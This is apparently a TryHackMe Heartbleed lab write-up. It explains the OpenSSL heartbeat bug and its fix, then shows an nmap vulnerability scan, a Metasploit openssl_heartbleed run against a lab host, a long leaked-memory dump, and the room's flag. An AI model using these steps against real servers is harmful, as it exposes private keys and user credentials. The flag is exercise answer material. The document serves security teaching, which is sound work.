---
SSL issues are still lurking in the wild. Can you exploit this web servers OpenSSL?
---

![|222](https://tryhackme-images.s3.amazonaws.com/room-icons/82db1237966d14e10bf2c66690989283.png)

### Background Information 



Introduction to Heartbleed and SSL/TLS


On the internet today, most web servers are configured to use SSL/TLS. SSL(secure socket layer) is just a predecessor to TLS(transport layer security). The most common versions are TLS 1.2 and TLS 1.3(which has recently been released). Configuring a web server to use TLS means that all communication from that particular server to a client will be encrypted; any malicious third party that has access to this traffic will not be able to understand/decrypt the traffic, and they also will not be able to modify the traffic. To learn more about how the TLS connections are established, check [1.2](https://tls.ulfheim.net/) and [1.3](https://tls13.ulfheim.net/) out.

Heartbleed is a bug due to the implementation in the OpenSSL library from versions 1.0.1 to 1.0.1f(which is very widely used). It allows a user to access memory on the server(which they usually wouldn't have access to). This in turn allows a malicious user to access different kinds of information(that they wouldn't usually have access to due to the encryption and integrity provided by TLS) including:

    server private key

    confidential data like usernames, passwords and other personal information

Analysing the Bug


The implementation error occurs in the heartbeat message that is used by OpenSSL to keep a connection alive even when no data is sent. A mechanism like this is important because if a connection dies/resets quite often, it would be expensive to set up the TLS aspect of the connection again; this affects the latency across the internet and it would make using services slow for users. A heartbeat message sent by one end of the connection contains random data and the length of the data, and this exact data is sent back when received by the other end of the connection. When the server retrieves this message from the client here's what it does:

    The server constructs a pointer(memory location) to the heartbeat record 

    It then copies the length of the data sent by a user into a variable(called payload)

        The length of this data is unchecked

    The server then allocates memory in the form of:

        1 + 2 + payload + padding(this can be maximum of 1 + 2 + 65535 + 16)

    The server then creates another pointer(bp) to access this memory

    The server then copies payload number of bytes from data sent by the user to the bp pointer

    The server sends the data contained in the bp pointers to the user

With this, you can see that the user controls the amount and length of data they send over. If the user does not send over any data(where the length is 0), it means that the server will copy arbitrary memory into the new pointer(which is how it can access secret information on the server). When retrieving data this way, the data can be different with different responses as the memory on the server will change. 

Remediation

To ensure that arbitrary data from the server isn’t copied and sent to a user, the server needs to check the length of the heartbeat message:

    The server needs to check that the length of the heartbeat message sent by the user isn’t 0

    The server needs to check the the length doesn’t exceed the specified length of the variable that holds the data

References:


http://heartbleed.com/

https://www.seancassidy.me/diagnosis-of-the-openssl-heartbleed-bug.html

https://stackabuse.com/heartbleed-bug-explained/



Read above and ensure you have a good understanding of how the Heartbleed vulnerability works.


### Protecting Data In Transit 

In this task, you need to obtain a flag using a very well known vulnerability. Make sure you pay attention to all the information and errors displayed. Pay particular attention to how web servers are configured.

It may take between 3-4 minutes for the server to deploy and configure. Please be patient.

	https://&lt;ip>

```
https://34.244.244.152/

My friend really like this Heartbleed song - I think you all will like it too 

┌──(kali㉿kali)-[~]
└─$ nmap -sV --script vuln 34.244.244.152  
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-11 17:32 EDT
Nmap scan report for ec2-34-244-244-152.eu-west-1.compute.amazonaws.com (34.244.244.152)
Host is up (0.19s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4 (protocol 2.0)
443/tcp open  ssl/http nginx 1.15.7
|_http-server-header: nginx/1.15.7
| ssl-ccs-injection: 
|   VULNERABLE:
|   SSL/TLS MITM vulnerability (CCS Injection)
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
|       does not properly restrict processing of ChangeCipherSpec messages,
|       which allows man-in-the-middle attackers to trigger use of a zero
|       length master key in certain OpenSSL-to-OpenSSL communications, and
|       consequently hijack sessions or obtain sensitive information, via
|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
|           
|     References:
|       http://www.cvedetails.com/cve/2014-0224
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
|_      http://www.openssl.org/news/secadv_20140605.txt
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|           
|     References:
|       http://www.openssl.org/news/secadv_20140407.txt 
|       http://cvedetails.com/cve/2014-0160/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
| http-vuln-cve2011-3192: 
|   VULNERABLE:
|   Apache byterange filter DoS
|     State: VULNERABLE
|     IDs:  BID:49303  CVE:CVE-2011-3192
|       The Apache web server is vulnerable to a denial of service attack when numerous
|       overlapping byte ranges are requested.
|     Disclosure date: 2011-08-19
|     References:
|       https://www.tenable.com/plugins/nessus/55976
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
|       https://seclists.org/fulldisclosure/2011/Aug/175
|_      https://www.securityfocus.com/bid/49303
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 304.93 seconds
zsh: segmentation fault  nmap -sV --script vuln 34.244.244.152


using metasploit (heartbleed)

┌──(kali㉿kali)-[~]
└─$ msfconsole -q                                      
msf6 > search heartbleed

Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   0  auxiliary/server/openssl_heartbeat_client_memory  2014-04-07       normal  No     OpenSSL Heartbeat (Heartbleed) Client Memory Exposure                                                                             
   1  auxiliary/scanner/ssl/openssl_heartbleed          2014-04-07       normal  Yes    OpenSSL Heartbeat (Heartbleed) Information Leak                                                                                   


Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/ssl/openssl_heartbleed                                                                                                        

msf6 > use 1
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > show options

Module options (auxiliary/scanner/ssl/openssl_heartbleed):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   DUMPFILTER                         no        Pattern to filter leaked memory before storing
   LEAK_COUNT        1                yes       Number of times to leak memory per SCAN or DUMP invocation
   MAX_KEYTRIES      50               yes       Max tries to dump key
   RESPONSE_TIMEOUT  10               yes       Number of seconds to wait for a server response
   RHOSTS                             yes       The target host(s), see https://github.com/rapid7/metasploi
                                                t-framework/wiki/Using-Metasploit
   RPORT             443              yes       The target port (TCP)
   STATUS_EVERY      5                yes       How many retries until key dump status
   THREADS           1                yes       The number of concurrent threads (max one per host)
   TLS_CALLBACK      None             yes       Protocol to use, "None" to use raw TLS sockets (Accepted: N
                                                one, SMTP, IMAP, JABBER, POP3, FTP, POSTGRES)
   TLS_VERSION       1.0              yes       TLS/SSL version to use (Accepted: SSLv3, 1.0, 1.1, 1.2)


Auxiliary action:

   Name  Description
   ----  -----------
   SCAN  Check hosts for vulnerability


msf6 auxiliary(scanner/ssl/openssl_heartbleed) > set rhosts 34.244.244.152
rhosts => 34.244.244.152
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > set verbose true
verbose => true
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > run

[*] 34.244.244.152:443    - Leaking heartbeat response #1
[*] 34.244.244.152:443    - Sending Client Hello...
[*] 34.244.244.152:443    - SSL record #1:
[*] 34.244.244.152:443    -     Type:    22
[*] 34.244.244.152:443    -     Version: 0x0301
[*] 34.244.244.152:443    -     Length:  86
[*] 34.244.244.152:443    -     Handshake #1:
[*] 34.244.244.152:443    -             Length: 82
[*] 34.244.244.152:443    -             Type:   Server Hello (2)
[*] 34.244.244.152:443    -             Server Hello Version:           0x0301
[*] 34.244.244.152:443    -             Server Hello random data:       095037ec2e26b3c52ef2be3935a6c9beee4c92934d655fcd61520cd67bd26dfe
[*] 34.244.244.152:443    -             Server Hello Session ID length: 32
[*] 34.244.244.152:443    -             Server Hello Session ID:        255b85ee135a2e2ba281b959adc15d6f1aafb656115a391939f8006f0c38dbb0
[*] 34.244.244.152:443    - SSL record #2:
[*] 34.244.244.152:443    -     Type:    22
[*] 34.244.244.152:443    -     Version: 0x0301
[*] 34.244.244.152:443    -     Length:  951
[*] 34.244.244.152:443    -     Handshake #1:
[*] 34.244.244.152:443    -             Length: 947
[*] 34.244.244.152:443    -             Type:   Certificate Data (11)
[*] 34.244.244.152:443    -             Certificates length: 944
[*] 34.244.244.152:443    -             Data length: 947
[*] 34.244.244.152:443    -             Certificate #1:
[*] 34.244.244.152:443    -                     Certificate #1: Length: 941
[*] 34.244.244.152:443    -                     Certificate #1: #<OpenSSL::X509::Certificate: subject=#<OpenSSL::X509::Name CN=localhost,OU=TryHackMe,O=TryHackMe,L=London,ST=London,C=UK>, issuer=#<OpenSSL::X509::Name CN=localhost,OU=TryHackMe,O=TryHackMe,L=London,ST=London,C=UK>, serial=#<OpenSSL::BN:0x00007f48b911a6a8>, not_before=2019-02-16 10:41:14 UTC, not_after=2020-02-16 10:41:14 UTC>
[*] 34.244.244.152:443    - SSL record #3:
[*] 34.244.244.152:443    -     Type:    22
[*] 34.244.244.152:443    -     Version: 0x0301
[*] 34.244.244.152:443    -     Length:  331
[*] 34.244.244.152:443    -     Handshake #1:
[*] 34.244.244.152:443    -             Length: 327
[*] 34.244.244.152:443    -             Type:   Server Key Exchange (12)
[*] 34.244.244.152:443    - SSL record #4:
[*] 34.244.244.152:443    -     Type:    22
[*] 34.244.244.152:443    -     Version: 0x0301
[*] 34.244.244.152:443    -     Length:  4
[*] 34.244.244.152:443    -     Handshake #1:
[*] 34.244.244.152:443    -             Length: 0
[*] 34.244.244.152:443    -             Type:   Server Hello Done (14)
[*] 34.244.244.152:443    - Sending Heartbeat...
[*] 34.244.244.152:443    - Heartbeat response, 65535 bytes
[+] 34.244.244.152:443    - Heartbeat response with leak, 65535 bytes
[*] 34.244.244.152:443    - Printable info leaked:
......cD.@.Rq..........[.....h....SP&...f.....".!.9.8.........5.............................3.2.....E.D...../...A.......................................6 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36..Content-Length: 75..Content-Type: application/x-www-form-urlencoded....user_name=hacker101&user_email=haxor@haxor.com&user_message=THM{sSl-Is-BaD}...>....z..8..$.ec-Fetch-Mode: no-cors..Sec-Fetch-Site: same-origin........)z.#.S...g....._..,;4B.....{.#...#.jF..4..l..X.+....................................-........@..t.<.y.......p.T.V...[.[.......|...&.....g.t.f.e.d...-.x.$./.`.../.J.].V.\...Z.Y.X.W.n.c.$.}.R...B.Q.".W.N.J.G.E...D.....A.@.?.>...:.6.4.5.......1.-.,.i.%.".X.............................................................+...k...........=.......e.................s.2.r.x...b.P.....D.9.)...3.(.^.K......................................................Id</string><string>.    DSMessagingVersion</string></traits><string>nil</string>.    <int>1</int></object><string>&x3;</string><int>5</int>.    <int>0</int><int>0</int></object></body></amfx>.OLN.Z..E....._Q..@o..................................................................................................................................... repeated 15037 times .....................................................................................................................................@..................................................................................................................................... repeated 16122 times .....................................................................................................................................@.................................................................................................................................................................................................................................................................................................................................a@......@..............A.<-.nD.........{fPgiv....S....-{gz...Cb.n..\.C/@...[O(.f.S,.J.cm3..<5...R.*;.#N.L.J.1.h[.+K..A...Q.....&....4.|n...<.<1M..e..G....[op%Xp.?^...O.NLG-.io....+L....9..U.-....^..Y...i.....T.....@..jZ..|..5..{+bH...:o.......`vr......&r..o.......,"G.x5.UY.>&..sar.C..i.B#...D.SN/......%.]...@B.`..#.Y\Jp.K.1...J5y...........X..{s..OA.=.......v..lJ.b.....Z.@...(.ph.2..?...'7.)...h......f..j....\Y..::.C......K~.r!.7..b~..w........#V..n.z.........$..l..D..o>.RJ..V9....+...z-A...$....=.V%...~......=..P..h..?....T............".T..T.3.....+.c..'..E...!!.%...E.+....o.2u*.5..fuBP.r:..v.sPY......P0N0...U........8X..z.....R.WdZ..-0...U.#..0.....8X..z.....R.WdZ..-0...U....0....0...*.H.................^UI..q.n.......".x..0w.k...\...U.....t.g.4.D<*m.\y...].M..qeH.S.U.N^m.,.|%..L"(I..K.k.....1..&M.P.|6..f...$A.......rZ..Zfg}[4...3.]..I.y._..|..$P.....{...W.Z.....y/......ZD....k.paq.>R..........|)......`............n.G.~.....-..6..+...$9f._".,~,......Cr..2a&T.<.K.@?..r.$|..[. .%rt..n...K......%........^&yy.......5..ViX.S@....U....M.......#....?.n.{......^..td..7..u..N..<.._Le..1...V..!..F.j.?.9.Q........n.ha'OU.!...`....|...,..bzv...).fnK..............VbM.i........h.,W....E.'j.k....ygtw....S...c.N.d.ceNR}.....8.....^.6X..g..ZQKO=...0M.N..\.....p.V.E......7q:X.S`....D..W....~....?..'.3...............uv.....Kz..K.#.o.gU..$e....R.r..8.$..x...kPJ;.P[..s...........X..9H@nI..........0..=.{.To.zu>....<.Fa..G....}.b77...8.H.5............\v.7P.U.....o.....?...fS(..S.....]X.....B...y..-....;...?0hF.(+....xp......C....R........W..M.'5.\.6...I.KP.*$..0A..Z.KQ.@..e.|...Y...q.).m.p.Z.....0.|......N/.9...N'.l.5}.x.^{.....a..gh~...n.5..m...........x.3...65...rtl.v.2.Z.........P.?..&L.w5..~.C...U...'<D.O.vO..........-T.......a.....{.).=..3.N{.....A..m...g....:..9!1b..(...:...,.....C.w?r.7...|.........`7D......n......P.+1v<.....<....~wT..(tE.........f.1..?..eJY..=...6.....U..p....Q.. ...v .R.:Wn....HC....!..~.......Am....n...W.....k.uC..w.i...W...R..lw..........I..2...+. ..3\.4.4..4.5 ......"<G.2n#y..k_I.bA.&.....<s..=..^....xA.U..6.....4...'....@..K..iH..-.$I...x....]....LQ?...Af.#0m.L...u'./........B.5.u.HA.Qj'y.E.z})T.JAB..,..AS&S/..CR...2...:l(..k.&.....y....hv..C.kW#7.?........?../. ..]:..`.;^.Z....].q+.........&\4...,;%.d..8.?...0....^.=.Gw...NQ....t..R<6.4.Way...nL2.I.v.Y^......... ..9dV.....Ny...d.m<.o..Z....x9..Wvd4j9{........O0...R...P ..C|..~mW.E.`...b.t.U("S..,....?.H{..'8i'......_..F.B'...p"-.-.}.Z........;.......!*...[N...Q..z.x.........h...t..d...G..i.[i..2....pR..XiW.+..b..e.............%.H@<q..&1.J....D..0........}.....U.........v.u.saX....eN.@!`......V.."+R.3..&t.......`...N....b...^..{..'.*...$..........><.......TM2.L......n>e-....mI$.......x..Q..%[....-z..1.i........E.6....@.@..u...+.{.....H....Z..?.....F-.]X[:.D.w......o..-b.C..9..........O:....b....I.%..-pU.M.....C(.f.I.....V........fI.Q. .zx*E...-..IO.._Ri..D......tG3.no.b.Yz).w.+}w.Z...O..*...a.D.1....Z..&`u:l?..v^.......PE9...U7..l.<1..(.D...n./....zE...I1T.sz.2....Ff..O0..VUM.......R..I.v&..S}.M}dN.....2q?..;e.R..h$..'.........!.........}s!.}VO@?..K...M...dN. ......*.zvC>....MJ==.....:.L.a..............vQ...'..)Hw.}i.3G...#..m..(uc...i.u.2B..8.!4.IF.-5..,~.....>...l.)..k. 2.r..K.).<-|..%P....lO&.......*....V...H<..M.|..i..8...MZ1...;.fY......o>..G..8....?m`.....,..lK8..kp+C.......V..0...~.].......+...<w...cf..b..,...}h:\wm}....R.lK..>T.#.w...G.q....V.4.F...R../.hs.>......:.._.7...\&..b.^..9..O..j......S..3.i.....x.s.......N..Q.....D.x/...MI.3...P.y...........f.....Z.Q....6.C`H...k.4..g..) ..1:%5;.U....uQ|.U....I...5....X...h >p.HW..^l..:..~Y.......lA.....z....h..JW...D..I&..X....j~P.......q...0"...txL.P............g..^n..;.8U.C.0c.z..|..F.d...nC....Y.L...3>..a..5.....&w{F.......b.}.......AQ/L.|.).$...........&dN4..A..L*=25....-.w.M....0@-p........D%.:d.......q...G..=5...4.8..1......Y.S....4........9vY+i.\vL..=...<u....4...N.F[...zu.....L..2.6..v./GN)..!."~...fT.V......+^........"x.+.^..uC..}/.|....gA..C..<.....l....=:]hF......X.V)s..-Hy...I..2..[`b....e...C.g...n....T8......q.1....;.....1.........&p.H..l...j...V..z0......4me#...iv.......c...+66.*V....-,...&1....;..Y\..:.&t.o.........m.Y.....<.....g..?.=.s.....U...#..!....^*...\..D.)..x/."0c9.....t5.v..HcZy.t~.o. ....<.O..0`.jm'.U.*08.<..^......M...5..Y...1..Ti..2...Z...qT.w...:.].qGx=..`k%{..B..X&...v....;.R.......^..r.;'..Q..0.0.7b.....U...T..9. ?...[s.[...\0..H..._.|.,p...$.4... RIQ.T..u...E.l.p.|].4\`......m..'."..-....A....R..R:X{.|.....'K.....F..ZOR+/..?..*n.44...=.Z..G.Q.*4>.A.q..../Yb\..K......B..i{...z.D.q.f9....mY8......w.Q...%....)N8K..U..!jY>..9..fb..k.q/........o...'^.....(+..........S..qP..............'p....H.R|.9.....V..r....w:........6.a.:...\...j1...~..5 ]..#E.9".T.{...8..|...H....9....C...<....y....^...f=...ld.X.4..],..........k^.....v/`.).......C......( ......v..w...."y|.pv..O.@._i.$-0..........7d.xF.~U..01..W;....4.nh.h@..OU..0.:.3....L...........{.;.I.........#.."...+!}.\l..^........{........_...J#...x?/..4#.4..j.=...}.hr$6.gl.....h.6l.ZF.o....0..JU..........l...`A.|....ES.z.....1.....p.o....1._..'....P..(....%qum-N..iKy...4..6wd.....(Uhz...+..5...K.....>l....I4..7(.>..1q..s.$Q_...i.X5.."....}....4:.......}.......tc.D........<..........#@...\Y(2....6L......"..,v..j.O'd.H....~.EC....).y.........5....w.W#5.......1...5*.....83.u.td.>de..r.U..2....*.Z.}.......X..i%...u..f..B.f.dU..f.Z.V..t..X}........._..S|..l..r.^Ud.......0>......C......E.5..&..e<...`....5S.L +...Pb(..$.J...O.K...K..@.8..={...A'.BK... ...j...M..G\./...d~4.7....V.Zl/....el...n.4V....%...-..g.Q...ni...IQ0.@..G..E.f...3....e`n.....681x...N..N/&..n.N.%.Zl..*..q...Z......r......~........QA..0...G7.C.YW...V.5..s....Z..n.....m.d#......>..kd.....-.....P........9...a.g.....bq..xH......X......>.m.....,......{......Dl{V...nz.`.........E.1......c..kkY\./....p...5....&.JI,....-ohu}...^^....[....%.)........>..h.......w..`.A....8RS..I...}.....` K.b.......J...c.......R.u..)..<.a..k....T1..ap......HS.n2yi.h.....D..}.F..|^Z8HP..b.5......,.z#D........(..[...m5..**.V.1.{.O.......h.m.'[E...97H...G>....t..A,.b.u.[...B.PX.I.........`.NZQF..*....d....z..VZNb...{w.3....d.jh.B.....$.mv].....-...b.^.....Q;T..g.YI..0%g.2.....#..*....L_.8g.7..x?!..X.:..%..A. P.....o.I/.....j..P3.R0&r^*8..nR..D...;,o]U...z....O&.*l...<J...l.H)D.....q..n"..\C{.,p?............6.s.i....."n.K./..?.(.0....0..w."x]^u.X.S.....p3..........h.X5.C.m...,zDT.H....|....}s.....`..|$K.1.....[;...A..w.........J..*...!.:.&.._."...S.Z...5\...P.P...u8o)...f.ZR?=.....i..hz..}..^$(y.8............M.N+..#*a.cqD.I...l*^N*d67R............{.........+..Z.....<..89+.....L..W...Z$.0.?.$.<...*%.Y..............o.*\.d....../...J.+.e..9..q..{.p...d7...S.f.u:....Y../....L...I..R.......~..G..d.zaQf..<b......c.....W:....?'.(..Z..-\...|.P.o.E.0dL...UM..^....Zy..hx....]....o......=...7....Q7-...... .L........pi3..d....:.M:.. .....f....kj...b.=J....<.}f.1$[..?7l\}PC.hB.....y...Z0~'..W.<.&yq..6.[..I..Txhv.yI.#B.....).*K.!4..x...t....._79....t5..c.....C..BY_1..R.>z[h?"....3..-.......E..m9_...>......sS...?)) |7..9.d.r....3vH.U.d.....Bk.v........[.......?.Y.vh*.N..=...6..4u.{.....X..R9N(9/.................A..+p.r......mE..........+..f...h...$..."r.P....=.......&._..+..h...r%A..TWwx.flj.X{(.....&.=..p.....F..\.`p.it.od....c....R=0^..B ...d4...X..(..O.Pz.:A. ....+I8....$8...E....=...|~G...05..Y..7..f.`..._I2$...D>....q. ..Tw..mf.I..).m..!....\<..M...G`F.|.....+ve.W....n.._4..]]..{....L..SU...bL..@.b..h....PW.[k.w.....J...G.....l....Jva......".PM.D.OS.oY....2...O..i..,"....7 .u.22*.(-!FUF.PL :,...Pt3}6...,;.=......Gc.{..g...K.....Mx...3...<.g.x..........8wn..W.......0.z-.$3...*.\...R+.....;qL..... .b,\.;....-..../..H}M.'...<,..a..K.......MC&g9i.;....O..Lk6...Q......1q?&VN.<.........Q..5....x.=n.....i....!#rF..wt.....]...#.[<.C..>.#...m..Ps...A.F..|z..).O#.........k.K.Iw..-.5sx...u...j......1+.....r.......RL..h7.d...N.#..B..p.....$..N.R.......dl/.... .....2H.....;o.\......&6.`...d......r.>s.......O{.....=.C1T.....RQl.a......Fv.....X...X...]..<.;........[..%.8E.iD.......!.2..$...:.ZC..L......{.5mS<x.%7..B1.^.i*8..........J...A.x.....6l_~..B..w.r..B...#.3.....T3k. .3...&.Tq.0.u......5.H*d_.`..~..en.......'.H.........~.C.../:..Q0..[.....e.t..G.6....^8...{.....].....<.fM.<2....y.iC..Za...9:5U.!..5'a.9....RL....T[.F..#.....hd...}...$M....?/.*uQ.Z...P.5Q....O.5. .e.t.TT.~......;4{`...QG.p..1..........O........,<.@u*....,Y.P,Uz.K....... ....Q.F?..*".C..n.}.<..&}.@u.$.kg.....6=..x.A...A.}..5......Pv...g.T9.h.....xy......j.Q.....e5.zrpM...s!........21.,..|-../dt........V.`z..c...(HpE..4^.r...B.n.]).*.....o/........W9:"..L...2..u[........./....;Xf...8...xL.a'v]Y.y.J..\73... .w%....V.Q.Q.|-...V...1...m.o..=.m...12....F#........t]......2...|5..8.+.H....&M..}...AY.1.>.g..."..;[......k\.5.C..2..K.`6. ......>..%.........B!....,...0.8;Q..7..1.i .{...0$.D.......D.....^{.....<..E....2...C..K,...P.. 5..o.9 ..4PK.....I...e.(r.<}.S...PB;...1...L4...2.'@9.8o..H......e........k.....@4z{....._....g....;.....%.!..R.0$.............d.}....z8...Q...M#.B.Q....{t..l...Wk..:UUs.rn..#.?i..2/..h.*..Z..6..!.._#1..\.E}$.A'-4...o.l.........\.m..e..d..X......J.b}..&.L7u..."?tX..........Y..'..g...._...@.M...............e...beYGg..........?.=.E...&...?Jb......].$...N{..lY...`.....O.W.....)./.Z..sx..t.a..}...E..X.z(..A.0..[6..u.h]..._.P(SK@.!FE..xd.....1...{..?,.x...$.UQ..29.k..!m2..]...A.....M5..".F.....!.GOd...<..CA....-.9....1..q.E....uA.../..s...Q.e..2q.....M.7..#...........`......R..\.IPO.B.n.....]."S....J.qd...U....eyl:]=..12.I.D.D.....L,.._...I'....4h\~.N$..i*..W7.....O1.X.*..S...Q.......i..Lo..j.q...d..........@..G`..)..{.~....k...o.......Q..GP....KvihFg.N..A.3h.~.&V....Wy|.[]D&...{....E..'.L..s.......w..uF...9.g.P....U..@~E../..m.^.fE......=.By.2.....Y..AI..`m.q2.....nE..... 6.....z.....>.....4..x.....Y.|....1..b6Z........ ....Z.o/."Ie|Uc.h..t...b..............3.%..[+!.U............%.iyMcN..o7.....h..,;...]..E..1.R..v.Q..S\..n...,.-/{R...v.w...p..?...?..!.@...[2..J..p?.H.....)C"..b..P.%d.o.P.Y.r.3..a..c.|.~..a...1l..F2.0.W.o..-...,...(..XK...K....e.._.I...... .`).....;..c....5d.....}o.i....p..{.h.k.!I"......eX@.*T..P.M'A .H8..,n.\..R.~(.w..u.Ueoh....{^..(bM.7....05....f.5=.<..d...h.C..Anr..`.5WN..U.%..d...{5...E.~.#G|...y..5..-.z.e&>".p. .r.Q..x-..,_\k..4..b....v.C.g.W1....<.n....T...zF.[.,^.b...P.y...4.V..<..yN.S.....0.-."..O2pB....!..A..\...-.w.[.....Fm@....!..F^..j.P.i....59.F.......W.......=].4z-2...0.'R`...{/..8....2....a&|.....!.z.CK..8.?..O2..0..i.N.YO.3.y..KdiD`. ..;4.. .,.Y(7Z5..,0...86..v.e..].H/F.A...#.`.KM2.s..4Qj:.~B1.t.n.....'.....v......u..vR{...X......q.........@.(..`..lc.A..tV..[.....1:...'.......qu.;F..M7.*..P.......Z2.|.*.x.....`fU..0.'...?...E.|-S.....3.e..l.kf..........??.....f!.O..E.h,y....z......./.C...?....d;.}.,.....l....Q...M.....x]..J]..n.@..../c...O..!...r+B.9Q\.i...x$..t.<..7...;Q..h_)../.....K+.$...-..[u..|b...A.. .+.....[.....IU.n;1..........e......A...<.P....i..`..O8.<.7....SC......lq..po.&Wv.o.....7.Hj.~......q.n....L.W....t._......x.W....q..*b@.x.^......L...e!.\.....a.%i.......@..s...g..,......y.dN..$O..g...Ja..........H...b.....O..$.y..C.YAn..p...p6..... ...F..)...:..A.^..z.vX..P..QN....}......:BZ.V"G4D6G...>g{|.S.8j...q$.Pe.Y;..;.)h..U{....8k....ekz...uo...............q-Y.b...Y....i.Y..P..4...LX..._.uZ.B,!..d;....3..H..x.Bc*'.f..4.+F ....#.w.........-:1...7)K.. ..[.8....iJ.Y..Z.Tf....P.....lV+.y.".6.U....,J...O........./.4........{....V....~..gb.v._m/....)...S7...SK.@.....Yo..?,.j.P....3..WP^...~.....B....1.I..B..d..y..pl..y.Se....-X.1..:..s....UU....Oe...1...U.f.V...c.X.6.N...N.Z ........`.o..8...."W.=^e...H..Q...Rd{F..O]............;.,*.?....5.N.i....v...P.s..{.\...z...@...nU.YT....[.#....n.!.h?_......DQ..M_5........}.^}.N.2...'-....Y.t3...E........;/."F.jC*..1,,....i/.j4k.P...'._=&.-:..1c..9.Tt..ye:......}..........;O....'....cm.DW@!.S....b..U.C..$.... K{%...I.a.EU!2............=@.)...<SVz........`......:.d.^..!.K"..]Cp!..p..>.......S......3}#..WrX.....e0.!K....7.....C..Pr..3.Z..g`j.@.%...R!p..._..h$..@.4F...UE.ME.....^...a.....={...`..P.t2`..*f.F._g@....e...3...x>...........f8.............83.] w..r]....W...PW........i.u0..P..Q3.R....5..v.@..28..g..K.\f...<....+.....[I(8.FV...- .Q.p.L..j.U$.....O....... .i..0s..........7N...b.=>)>.....G.xn..Y:..}j..Oi......P54....{....9...L|Cg$."`...........[.s....3.\.~k......x.....H.5o..P.....A.f.y....o.....,.......v.......6M...7v...(.-..1....]j(.....|.N,.'......6s.B.}..Q.e.....V.Ua.1L4.."...A.mq.......uMj....%..K.<...r. 7:+..B...e.$Q....>Y  .....|.cW......C5.....[..A(R..v".&.....#...h.c=.u....v.b..i.6.U..hd........59.....1&...f&.m#S..|..f......<:..J.?.]*@J\VE.l5....@?....b...et..o.T.@.'...?....m.....jT5Jh..k(......a..x...c..l(...L./.....!o.x..v.s. a...L....;.L@.U.....+.p....3.].}.b.....j.Y.L.}.T<.h..1.'=.4.Q..n...wvH|=.h`.o....r...xd.^1fwGV...C.#.\...V..._....s.d.UQ^.*..w7../.l.A.qj..>..'.....|.e..Dw .{..U............P..........d.w...8\....&..........zr.R.v...`Z......Z.&c.K..=.......=.o..l\S&+.SJ....L..".D.[l....vx$.....-.e..U...f..g....Z..ewg3.4.......V.......f.Fp...f..X..lyWSF..0.O..6.........s.!u.O.....(D.r...s....!jo...&BE'..3...g......O.[.O..%=.Xdz(..*{...H.>h.....E..X...D.W.q..I...._+3.7.J..:t[O. G..N...C.U?...d4c.hR...t..'....h...Rj.$P.S...^......8.....N.}O.F..t...a..Di.,wX..'N5....%..%....I.B..\.ep..R..7..7P.c\.....u.2........*2..}L....V....Y@Vq5.B[/...,.'./....5..$Y..E....E.b.1.E......'.a...K....zd9\.7......."....(_2]@w....LU......_".J8Q9.O.S...*....pq........~.R.J....!...........r.A.s..[..C.w..u..I.......bv,.7p.Tc.J.p.(X...m...T.!I,.sP.Jjn..w..U..@.....o.....g.J93Z...V..@.X..s.6.J..C.....T......#..Xx.....B....u|~&..............;..M/.\'.....;..A....Pu.....R.0!3.8..N.33.rS....../.-'.X.[+kyJ>.]..kb#)3y.....V...5fwA..IR.?.=.....]%E.a.__......2?.O..fM.6....p.4f.".ho...cG.;.0.Xx..".0.N.....S..pou.....^@..N~...L'.*4...j....l..6I..Kh_...5.e.f...&.`...F....-.5..~.:.D.+81.....l..u9].Q.....TNG,;l9-.SI+.IW"h..&.A..W.^... .+...@..}.T.8.s..!F...D.w..Q...GQS/..'.....c...5A;H#._.6.26.N...?.0m.ED|. .....[..H..z..[J~........]..Abjc..9.=d..8i]....$.b(..-.R........&[...5`>7......dP+T...v..~...k;C..0...Y.yE.M).*.o....w.w............{F.4"U.#..zOr#.{....1..$..0..u..;.g.I.QJ.......$...o{.=Lx...]......3.1.nWeC...i.F.5n.S./......+..7.h.=...r..., .....N`L?:.....>,vp$[...p.J]6.^...P.2...|....3..`.9.M_o,_.o....0.$x...1...S........#Sw0.oW......Y...._..Z.w.....(./...;Q<. ..q.?)...t...x..:.....w9...\b..v...........Q.....V.......... m..K;.v......@/o\....Ef..!.....J\..W.B.ZX...uK.........,.9....#....r.......g$.6.qYh'#..".....e..M..Jk.&]....08/x..'...g.oB.:........./@|$.....L..{bi.V-".v..../.....S..=.vo..&....c._S.jW..I..Z...3..eo..m..4..X..F..f0p....\.z../...R,B.........n9....Y.Z.~.......Y....,..Y.k.....u\ ..E.Z.....}W.>Z...q.Xd....W..X.....'.2...L*.%...*{#.|.q 